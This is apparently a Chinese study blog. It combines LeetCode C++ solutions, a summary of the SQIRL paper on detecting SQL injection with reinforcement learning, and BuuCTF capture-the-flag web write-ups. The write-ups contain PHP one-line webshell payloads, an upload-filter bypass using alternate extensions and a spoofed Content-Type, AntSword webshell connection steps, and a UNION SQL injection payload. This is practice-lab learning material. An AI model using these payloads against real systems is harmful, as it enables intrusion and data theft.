    <div class="e-content article-entry" itemprop="articleBody">
      
        <h4 id="LeetCode"><a href="#LeetCode" class="headerlink" title="LeetCode"></a>LeetCode</h4><h5 id="多数元素"><a href="#多数元素" class="headerlink" title="多数元素"></a>多数元素</h5><p>找出给定整数数组中的主要元素。</p>
<p>函数接收一个整数数组nums作为参数。首先获取数组的长度s，然后对数组进行排序。由于主要元素是出现次数超过数组长度一半的元素，因此排序后数组的中间元素一定是主要元素。所以函数返回排序后数组的中间元素nums[s&#x2F;2]。整个函数的时间复杂度取决于排序算法的复杂度，一般情况下为O(nlogn)，其中n为数组nums的长度。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">majorityElement</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> s=nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(),nums.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">return</span> nums[s/<span class="number">2</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h5 id="2的幂"><a href="#2的幂" class="headerlink" title="2的幂"></a>2的幂</h5><p>判断一个数是否为2的幂。</p>
<p>函数中首先将输入的整数n赋值给变量m，然后进行循环判断。在循环中，如果m为0，则返回false；如果m能被2整除或者等于1，则将m除以2继续循环；否则返回false。最后返回true。该函数的时间复杂度取决于输入的整数n的大小，最坏情况下为O(logn)。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isPowerOfTwo</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> m=n;</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">while</span>(m!=<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(m%<span class="number">2</span>==<span class="number">0</span> || m==<span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                m=m/<span class="number">2</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h5 id="有效的字母异同位"><a href="#有效的字母异同位" class="headerlink" title="有效的字母异同位"></a>有效的字母异同位</h5><p>判断两个字符串是否为异位词。</p>
<p>函数中首先定义了两个长度为26的数组s1和s2，用于记录字符串s和t中各个字符出现的次数。然后分别遍历字符串s和t，统计每个字符出现的次数，并存储在对应的数组中。最后比较两个数组中每个位置上的值，如果有不同的情况则返回false，否则返回true。整个函数的时间复杂度为O(n)，其中n为字符串s和t的长度。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isAnagram</span><span class="params">(string s, string t)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> s1[<span class="number">26</span>]=&#123;<span class="number">0</span>&#125;,s2[<span class="number">26</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="type">int</span> n1=s.<span class="built_in">length</span>(),n2=t.<span class="built_in">length</span>();</span><br><span class="line">        <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n1;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            s1[s[i]-<span class="string">&#x27;a&#x27;</span>]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n2;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            s2[t[i]-<span class="string">&#x27;a&#x27;</span>]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">26</span>;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(s1[i]!=s2[i]) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="BuuCTF"><a href="#BuuCTF" class="headerlink" title="BuuCTF"></a>BuuCTF</h4><h5 id="12、Knife"><a href="#12、Knife" class="headerlink" title="12、Knife"></a>12、Knife</h5><p>使用蚁剑，安装教程<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/367151320">渗透工具：蚁剑教学 （安装+入门） - 知乎 (zhihu.com)</a></p>
<p>构造payload：<code>/?&lt;?php eval($_POST[&quot;Syc&quot;]);?&gt;</code></p>
<p>打开蚁剑添加数据</p>
<p>URL地址为：<a target="_blank" rel="noopener" href="http://1c5dc4d2-1605-4b89-99ba-90068b6d2182.node4.buuoj.cn:81/index.php">http://1c5dc4d2-1605-4b89-99ba-90068b6d2182.node4.buuoj.cn:81/index.php</a></p>
<p>密码为：Syc</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/571e5c69-fd79-42ac-b19c-763a2829d8cd" alt="image"></p>
<p>测试连接，连接成功，再点击添加</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/f59bd98d-4a3b-49f2-8a9c-1dcc3501da10" alt="image"></p>
<p>右键单击，选择文件管理</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/57e65112-788b-4318-a13f-a71402bff8fa" alt="image"></p>
<p>查看根目录，发现有个flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/10606a37-f6d4-4239-8dd6-d593206d2c52" alt="image"></p>
<p>双击查看，得到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/66b20406-1aeb-403e-9833-8ee8bbb16270" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;1248bbb7-c099-4589-a699-63d87c2ec2d3&#125;</span><br></pre></td></tr></table></figure>

<h5 id="13、Upload"><a href="#13、Upload" class="headerlink" title="13、Upload"></a>13、Upload</h5><p>创建一个木马文件</p>
<p>可绕过的后缀名检测：<code>php,php3,php4,php5,phtml.pht</code></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d5773950-aba3-4d69-a0d9-9c2fe6191a33" alt="image"></p>
<p>上传该文件，显示Not image!</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/8b9a3900-f491-4db5-93ce-7f7b44e9b7a6" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/5051e49c-61ef-4826-9d5e-7cf5f8a80d93" alt="image"></p>
<p>抓包，修改<code>Content-Type</code>的内容为 <code>image/jpeg</code>，send，查看文件名后缀应为.phtml</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/60a1de1b-9b4e-43d7-a5fd-ee5509f92155" alt="image"></p>
<p>使用蚁剑</p>
<p>URL地址为：<code>/upload/a.phtml</code></p>
<p>连接密码为：<code>a</code></p>
<p>测试连接，连接成功后添加</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/db0568d7-6c26-4c82-9143-76b47e48f6c1" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/257b7d7f-ab0b-40ff-8b31-f6fd24c64273" alt="image"></p>
<p>右键单击，文件管理，查看根目录，找到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/ad1fc581-4537-4c03-ac3f-bd0b85cb88e2" alt="image"></p>
<p>双击查看flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/e2bff410-6c2e-406d-a06b-ae6b6d83e92b" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;34c3fd89-3b0b-450b-9953-287122b67247&#125;</span><br></pre></td></tr></table></figure>

<h5 id="14、Upload"><a href="#14、Upload" class="headerlink" title="14、Upload"></a>14、Upload</h5><p>上传一句话木马<code>&lt;?php eval($_POST[a]);?&gt;</code>，修改后缀名为<code>.jpg</code></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/c12f4d12-96db-41d7-8f3a-6e9c6d95deb0" alt="image"></p>
<p>抓包，显示上传成功</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/52dea5e6-0636-44ab-a307-104363826373" alt="image"></p>
<p>使用蚁剑连接，URL地址为：<code>http://458e3dd3-d7c3-41c5-b4cd-06727f565048.node4.buuoj.cn:81/./uplo4d/394659692a460258b45a99f1424ea357.jpg</code></p>
<p>连接密码为：<code>a</code></p>
<p>尝试一下，测试连接显示返回数据为空</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/3cac98aa-ef81-4468-a8ef-e0792d7a8c6d" alt="image"></p>
<p>尝试修改后缀名为.phtml</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/455b5f6b-955a-4acc-98f4-1e4766489658" alt="image"></p>
<p>使用蚁剑连接，URL地址为：<code>http://458e3dd3-d7c3-41c5-b4cd-06727f565048.node4.buuoj.cn:81/./uplo4d/71056c0c9cb12f2b7d720156da9eabf1.phtml</code></p>
<p>连接密码为：<code>a</code></p>
<p>测试连接，连接成功 后添加</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/6d2c4b89-6449-40f7-b266-2fb166362b62" alt="image"></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/d91e8710-36d0-45ea-b5af-941f2b401a04" alt="image"></p>
<p>右键单击，文件管理</p>
<p>在根目录中找到flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9ca56033-b394-40c2-8378-bcc65f53e15b" alt="image"></p>
<p>双击查看flag</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9166d150-0624-44fd-b1ef-9fea0ea3dfef" alt="image"></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;8337ba06-02fe-47b4-8563-e341d08b19fe&#125;</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/02/18/20240218/" data-id="clsqz82xl0000t0vfe8ja3rl0" data-title="20240218" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/learn/" rel="tag">learn</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-Paper-SQIRL" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/02/16/Paper-SQIRL/" class="article-date">
  <time class="dt-published" datetime="2024-02-16T13:15:59.000Z" itemprop="datePublished">2024-02-16</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/02/16/Paper-SQIRL/">SQIRL__</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h3 id="SQIRL-Grey-Box-Detection-of-SQL-Injection-Vulnerabilities-Using-Reinforcement-Learning-论文分享"><a href="#SQIRL-Grey-Box-Detection-of-SQL-Injection-Vulnerabilities-Using-Reinforcement-Learning-论文分享" class="headerlink" title="SQIRL: Grey-Box Detection of SQL Injection Vulnerabilities Using Reinforcement Learning 论文分享"></a>SQIRL: Grey-Box Detection of SQL Injection Vulnerabilities Using Reinforcement Learning 论文分享</h3><p>Wahaibi, S. A., Foley, M., &amp; Maffeis, S. (2023). SQIRL: Grey-Box Detection of SQL Injection Vulnerabilities Using Reinforcement Learning. <em>32nd USENIX Security Symposium (USENIX Security 23)</em>, 6097–6114.</p>
<p>pdf链接：<a href="">usenix.org&#x2F;system&#x2F;files&#x2F;usenixsecurity23-al-wahaibi.pdf</a></p>
<p>SQIRL：使用强化学习的SQL注入漏洞灰盒检测</p>
<p>SQIRL是一种基于深度强化学习，使用多个工作代理和灰盒反馈来检测SQL注入漏洞的新方法，使用单个代理来学习如何修正SQL语法、转义上下文和绕过sanitisation。</p>
<p>SQIRL：使用强化学习的SQL注入漏洞灰盒检测，SOIRL是一种基于深度强化学习，使用多个工作代理和灰盒反馈来检测SQL注入漏洞的新方法，使用单个代理来学习如何修正SQL语法、转义上下文和绕过sanitisation</p>
<h5 id="绕过sanitisation"><a href="#绕过sanitisation" class="headerlink" title="绕过sanitisation"></a>绕过sanitisation</h5><p>sanitize相当于把HTML语句中不允许出现的元素和属性删除</p>
<p>绕过sanitisation就是绕过这些不允许出现的元素和属性</p>
<p>syntax fixing, context escape, and sanitisation bypass</p>
<h5 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h5><p>SQL数据库应用广泛，为攻击者提供了重要的攻击面，但是由于只有复杂的有效载荷才会出发SQLi漏洞，因此SQLi漏洞很难被发现</p>
<p>现存的SQL注入漏洞扫描器局限</p>
<ol>
<li>漏洞扫描器通常用于在投入生产之前找到漏洞，但是它们有时依赖于错误处理和网页上的SQL查询的反馈，导致在不存在错误时的有效性不高</li>
<li>现有的扫描器使用简单的基于规则的方法来覆盖最常见的SQL注入有效载荷，但是这些有效载荷缺乏多样性，并且无法根据特定的网络应用程序来制定有效载荷，导致扫描器忽略了合法的漏洞</li>
</ol>
<p>本文的贡献</p>
<ol>
<li>为代理实现一个强化学习(RL)环境，为SQL注入模糊Web应用程序，通过我们扩展的最先进的爬虫识别输入。</li>
<li>设计并实现了SQIRL，一种新的深度强化学习模糊方法。单个RL代理完成SQL注入的三项任务：语法修复、上下文转义和清理旁路，并且使用联合方式的工作代理在代理之间共享这些知识</li>
</ol>
<h5 id="强化学习"><a href="#强化学习" class="headerlink" title="强化学习"></a>强化学习</h5><p> （待补充）</p>
<h5 id="联邦学习"><a href="#联邦学习" class="headerlink" title="联邦学习"></a>联邦学习</h5><p>联邦学习是多个客户端模型在一段时间内独立训练，将学习得到的参数发送给中央服务器模型，服务器模型对得到的参数进行汇总（通常是求平均值），然乎将汇总后的参数发送给客户端，客户端使用新的参数进行训练，直至模型收敛。</p>
<p>在RL模型中使用FL，有两种形式，一种是横向的，即客户端与不同的环境交互；另一种是纵向的，也就是客户端与同一环境的多个实例交互，纵向RL通常被称为在RL环境中使用“worker”</p>
<p>SQL注入漏洞就是在网络应用程序的客户端注入有效载荷，使服务器上的网络应用程序数据库中执行意外的SQL查询。</p>
<p>SQL注入有效载荷的示例如下表所示</p>
<p>A：SQLi有效载荷（粉红色标出），转义其SQL上下文，导致数据库暂停1秒</p>
<p>B-D：SQL查询，显示用户输入可能出现的13个语义不同的位置</p>
<p>E：当前WordPress中危险的参数化查询模式示例</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/0f058974-865d-4a4f-8cf1-29ff27da0e9e" alt="image"> </p>
<p>查找SQLi漏洞的主要步骤</p>
<p>1、识别可能易受SQLi攻击的输入位置，这些位置包括URL、输入标记以及与网页相关的动态链接元素</p>
<p>2、一旦找到输入位置，就可以制作有效载荷，有效载荷必须满足4个条件才能触发SQLi</p>
<p>1）生成语法上有效的SQL，以避免执行中的错误</p>
<p>2）逃避预期的SQL上下文</p>
<p>3）绕过应用于负载的任何基于黑名单的过滤</p>
<p>4）改变SQL语句的预期行为</p>
<p>例如（假设没有过滤，标1中红色所示的有效负载会转义为“并执行SLEEP语句”）</p>
<p>SQLi有效载荷的特点：</p>
<p>1、现有有效载荷的稀疏性，针对输入验证和校验，能够绕过这些验证和校验的有效载荷变得越来越复杂</p>
<p>2、现有有效载荷分布不均，导致出现群集，即通过有效载荷的变化产生漏洞</p>
<p>这张图是本文对收集到的1028个独特有效载荷进行PCA降维（通过字节对编码对有效载荷进行标记，使用Doc2Vec提取每个有效载荷的128个特征嵌入，并通过PCA将嵌入从128维减少到3维）</p>
<p>下图就展示了现在有效载荷空间中有效载荷分布不均</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/65da16d0-9d11-4b9f-885b-e92977aa6f16" alt="image"> </p>
<p>SQIRL实现</p>
<p>架构</p>
<p>图2：SQIRL体系结构。RL代理(绿色)计算当前有效载荷的突变。N个联合的本地工人(紫色)训练不同的代理为全局代理收集经验。然后，与web应用程序交互的环境元素(蓝色)找到输入位置，在请求中提交有效载荷，并监控数据库是否成功注入。</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/3523614b-07ed-4d5d-968f-738f244d7148" alt="image"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/02/16/Paper-SQIRL/" data-id="clsooc1v300004kvfb94bbhvr" data-title="SQIRL__" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%AE%BA%E6%96%87%E7%BB%86%E8%AF%BB/" rel="tag">论文细读</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-20240215" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/02/15/20240215/" class="article-date">
  <time class="dt-published" datetime="2024-02-15T10:44:30.000Z" itemprop="datePublished">2024-02-15</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/02/15/20240215/">20240215</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h4 id="LeetCode"><a href="#LeetCode" class="headerlink" title="LeetCode"></a>LeetCode</h4><h5 id="加一"><a href="#加一" class="headerlink" title="加一"></a>加一</h5><p>当对数组 digits 加一时，只需要关注 digits 的末尾出现了多少个 999 即可。可以考虑如下的三种情况：</p>
<p>如果 digits 的末尾没有 999，例如 [1,2,3]，那么直接将末尾的数加一，得到 [1,2,4] 并返回；</p>
<p>如果 digits 的末尾有若干个 999，例如 [1,2,3,9,9]，那么只需要找出从末尾开始的第一个不为 999 的元素，即 333，将该元素加一，得到 [1,2,4,9,9]。随后将末尾的 999 全部置零，得到 [1,2,4,0,0] 并返回。</p>
<p>如果 digits 的所有元素都是 999，例如 [9,9,9,9,9]，那么答案为 [1,0,0,0,0,0]。只需要构造一个长度比 digits 多 111 的新数组，将首元素置为 111，其余元素置为 000 即可。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">plusOne</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; digits)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n=digits.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(digits[n<span class="number">-1</span>]!=<span class="number">9</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            digits[n<span class="number">-1</span>]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(digits[n<span class="number">-1</span>]==<span class="number">9</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(n==<span class="number">1</span>) </span><br><span class="line">            &#123;</span><br><span class="line">                digits[n<span class="number">-1</span>]=<span class="number">0</span>;</span><br><span class="line">                digits.<span class="built_in">insert</span>(digits.<span class="built_in">begin</span>(), <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                digits[n<span class="number">-1</span>]=<span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span>(i=n<span class="number">-2</span>;i&gt;=<span class="number">0</span>;i--)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span>(digits[i]==<span class="number">9</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        digits[i]=<span class="number">0</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        digits[i]++;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(i==<span class="number">0</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        digits.<span class="built_in">insert</span>(digits.<span class="built_in">begin</span>(), <span class="number">1</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> digits;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h5 id="验证回文串"><a href="#验证回文串" class="headerlink" title="验证回文串"></a>验证回文串</h5><p>最简单的方法是对字符串 s 进行一次遍历，并将其中的字母和数字字符进行保留，放在另一个字符串中。这样只需要判断是否是一个普通的回文串即可。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isPalindrome</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n=s.<span class="built_in">length</span>();</span><br><span class="line">        <span class="type">int</span> i=<span class="number">0</span>,x=<span class="number">1</span>;</span><br><span class="line">        <span class="type">char</span> zm[n+<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>((<span class="string">&#x27;a&#x27;</span>&lt;=s[i] &amp;&amp; s[i]&lt;=<span class="string">&#x27;z&#x27;</span>) || (<span class="string">&#x27;A&#x27;</span>&lt;=s[i] &amp;&amp; s[i]&lt;=<span class="string">&#x27;Z&#x27;</span>) || (<span class="string">&#x27;0&#x27;</span>&lt;=s[i] &amp;&amp; s[i]&lt;=<span class="string">&#x27;9&#x27;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                zm[x]=<span class="built_in">tolower</span>(s[i]);</span><br><span class="line">                x++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=x/<span class="number">2</span>;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(x==<span class="number">1</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(zm[i]!=zm[x-i])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h5 id="只出现一次的数字"><a href="#只出现一次的数字" class="headerlink" title="只出现一次的数字"></a>只出现一次的数字</h5><p>定义数组，数字n出现一次，v[n]加一，最终v[n]为1的话就说明n只出现了一次。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">singleNumber</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//30000个负数，30000个正数，1个0</span></span><br><span class="line">        <span class="type">int</span> n=nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">v</span><span class="params">(<span class="number">60010</span>,<span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            v[nums[i]+<span class="number">30000</span>]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">60010</span>;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(v[i]==<span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        i=i<span class="number">-30000</span>;</span><br><span class="line">        <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="BuuCTF"><a href="#BuuCTF" class="headerlink" title="BuuCTF"></a>BuuCTF</h4><h4 id="10、LoveSQL"><a href="#10、LoveSQL" class="headerlink" title="10、LoveSQL"></a>10、LoveSQL</h4><p>尝试万能密码</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/c41017b4-189d-4bb3-9734-cbe9b67f1176" alt="image"></p>
<p>有显示</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/28f501c1-3599-4279-b421-f10026b15978" alt="image"></p>
<p>尝试联合查询，查到3的时候回显正常</p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/c732357b-32f9-4208-a8e8-1238c2ddc296" alt="image"></p>
<p>爆数据库password&#x3D;:<code>1&#39; union select 1,2,database()#</code></p>
<p><img src="https://github.com/dbqyw/qyw.github.io/assets/130265921/9e319507-1e47-4c7d-b1c3-513dfe8567dc" alt="image"></p>
<p>爆出数据库名为geek</p>
